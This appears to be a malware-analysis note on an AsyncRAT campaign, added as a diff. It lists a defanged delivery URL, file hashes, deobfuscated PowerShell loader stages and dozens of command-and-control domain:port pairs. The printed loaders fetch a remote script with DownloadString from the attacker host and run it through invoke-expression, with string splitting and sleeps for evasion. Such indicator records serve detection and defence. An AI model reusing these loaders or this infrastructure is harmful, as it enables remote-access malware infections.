@@ -1,0 +1,114 @@
+AsyncRAT 2022 | 03.02.2022 
+
+************************************************************************************************************
+
+hxxp://documents.pro.br/Documents2022/5[.]docx
+
+.doc c748f877cd050c71bc077d85faa2e44d6d3050143a3d993b084ef2aeb6b218be
+
+.injction.mp3 a7dfc0256488cfba6de9c37625a72a7352d273c41fc7b3556ad60fc99b10a1f0
+
+.kilword.jpg
+
+$mepfwzk = "(New-"
+[system.threading.thread]::sleep(234)
+$akdgrxu = "Object "
+$iaywbdm = "Net"
+$iwy5sbx = ".We"
+[system.threading.thread]::sleep(412)
+$y9xea6n = ".Downlo"
+$mpngjbw = "bClient)"
+$ytryuyf = "adString('hxxp://documents.pro.br/kilword.jpg')"
+[system.threading.thread]::sleep(009)
+$9eubm0m = invoke-expression "(New-Object Net.WebClient).DownloadString('hxxp://documents.pro.br/kilword.jpg')"|invoke-expression
+# powershell snippet 1
+(new-object net.webclient).downloadstring("hxxp://documents.pro.br/kilword.jpg")
+
+.new.jpg
+
+$ftka0p9 = "(New-"
+[system.threading.thread]::sleep(409)
+$4fhzi23 = "Object "
+$qcwxpcm = "Net"
+$rvhipbf = ".We"
+[system.threading.thread]::sleep(510)
+$f0pds3a = ".Downlo"
+$qy5nxiq = "bClient)"
+$fszalxs = "adString('hxxp://documents.pro.br/new.jpg')"
+[system.threading.thread]::sleep(468)
+$hd9tcth = invoke-expression "(New-Object Net.WebClient).DownloadString('hxxp://documents.pro.br/new.jpg')"|invoke-expression
+
+scripts:
+
+hxxp://documents.pro.br/injction.mp3 < .vbs 
+hxxp://documents.pro.br/kilword.jpg < .ps1 
+hxxp://documents.pro.br/new.jpg < .ps1 
+
+
+c2's
+
+googledrives.ddns.net:2021
+googledrives.ddns.net:2020
+googledrives.ddns.net:2019
+googledrives.ddns.net:2018
+googledrives.ddns.net:5000
+googledrives.ddns.net:9909
+googledrives.ddns.net:4000
+googledrives.ddns.net:2000
+googledrives.ddns.net:8848
+googleservice64.ddns.net:2021
+googleservice64.ddns.net:2020
+googleservice64.ddns.net:2019
+googleservice64.ddns.net:2018
+googleservice64.ddns.net:5000
+googleservice64.ddns.net:9909
+googleservice64.ddns.net:4000
+googleservice64.ddns.net:2000
+googleservice64.ddns.net:8848
+cdtpitbull.hopto.org:2021
+cdtpitbull.hopto.org:2020
+cdtpitbull.hopto.org:2019
+cdtpitbull.hopto.org:2018
+cdtpitbull.hopto.org:5000
+cdtpitbull.hopto.org:9909
+cdtpitbull.hopto.org:4000
+cdtpitbull.hopto.org:2000
+cdtpitbull.hopto.org:8848
+cdtopicadasgalaxias.ddns.net:2021
+cdtopicadasgalaxias.ddns.net:2020
+cdtopicadasgalaxias.ddns.net:2019
+cdtopicadasgalaxias.ddns.net:2018
+cdtopicadasgalaxias.ddns.net:5000
+cdtopicadasgalaxias.ddns.net:9909
+cdtopicadasgalaxias.ddns.net:4000
+cdtopicadasgalaxias.ddns.net:2000
+cdtopicadasgalaxias.ddns.net:8848
+111234cdt.ddns.net:2021
+111234cdt.ddns.net:2020
+111234cdt.ddns.net:2019
+111234cdt.ddns.net:2018
+111234cdt.ddns.net:5000
+111234cdt.ddns.net:9909
+111234cdt.ddns.net:4000
+111234cdt.ddns.net:2000
+111234cdt.ddns.net:8848
+cdtcorporate.duckdns.org:2021
+cdtcorporate.duckdns.org:2020
+cdtcorporate.duckdns.org:2019
+cdtcorporate.duckdns.org:2018
+cdtcorporate.duckdns.org:5000
+cdtcorporate.duckdns.org:9909
+cdtcorporate.duckdns.org:4000
+cdtcorporate.duckdns.org:2000
+cdtcorporate.duckdns.org:8848
+warzonecdt.duckdns.org:2021
+warzonecdt.duckdns.org:2020
+warzonecdt.duckdns.org:2019
+warzonecdt.duckdns.org:2018
+warzonecdt.duckdns.org:5000
+warzonecdt.duckdns.org:9909
+warzonecdt.duckdns.org:4000
+warzonecdt.duckdns.org:2000
+warzonecdt.duckdns.org:8848
+
+
